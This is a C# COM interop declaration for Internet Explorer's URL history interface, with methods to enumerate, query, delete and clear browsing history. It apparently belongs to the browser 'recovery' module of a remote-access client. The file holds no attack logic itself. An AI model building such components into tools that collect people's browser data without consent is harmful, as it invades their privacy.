using System;
using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

[ComImport]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
[Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
public interface IUrlHistoryStg2 : IUrlHistoryStg
{
	new object EnumUrls
	{
		[return: MarshalAs(UnmanagedType.IUnknown)]
		get;
	}

	new void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags);

	new void DeleteUrl(string pocsUrl, int dwFlags);

	new void QueryUrl([MarshalAs(UnmanagedType.LPWStr)] string pocsUrl, STATURL_QUERYFLAGS dwFlags, ref STATURL lpSTATURL);

	new void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut);

	void AddUrlAndNotify(string pocsUrl, string pocsTitle, int dwFlags, int fWriteHistory, object poctNotify, object punkISFolder);

	void ClearHistory();
}
